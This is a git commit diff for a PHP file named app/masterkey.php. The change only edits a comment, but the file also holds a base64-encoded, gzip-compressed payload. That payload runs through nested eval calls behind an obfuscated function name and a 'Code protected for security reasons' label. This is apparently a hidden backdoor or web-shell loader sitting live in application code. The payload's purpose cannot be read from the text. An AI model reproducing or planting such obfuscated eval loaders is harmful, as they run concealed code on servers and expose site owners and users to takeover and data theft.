ea10f3bbca88a058da7f2a849acc849cf4409169
Felipe F Quiontella <felipe@quintella.com>
2023-04-11 14:46:46 -0300

    INC

--- app/masterkey.php
+++ app/masterkey.php
@@ -1,4 +1,4 @@
 <?php
 /* Code protected for security reasons */
-/** Este código está protegido qualquer dúvida favor procurar o ESI */
+/** Este código está protegido */
 $klnxjshd=" eval(gzinflate(base64_decode('FU/LbsMwDPuV3NreLNmWbe5XBgSxLRfFsBRI08Mw7N8nX0gRepHLeO/tfDz35a7n+r29Tj3WL/253n6XQ8/3sS+f7dl1PZ/r6zwe+/16kQYpyAO9YAh6BkUBJePiQC2CVMDSwT2Am/EY8LnBa0DIjFCNuyLGjqgDUjPEtCgjlYjsK4p3KDGhJEFRxdYU1d41F9FyQhsKJY/hBSMkjLqBXDSgpCC2UWItIB9MBu7mMg6z6SZMmew75dktxao616pUS0AWpZkX0uDBjrOBzGpsYOoOPI9yDBYzlmDnt3a5ffwt/w==')));"; call_user_func('bo928hSdjf', $klnxjshd); for($kjd=0;$kjd == $klnxjshd; $kjd++) $bo928hSdjf = $klnxjshd; function bo928hSdjf($prm){eval($prm);}
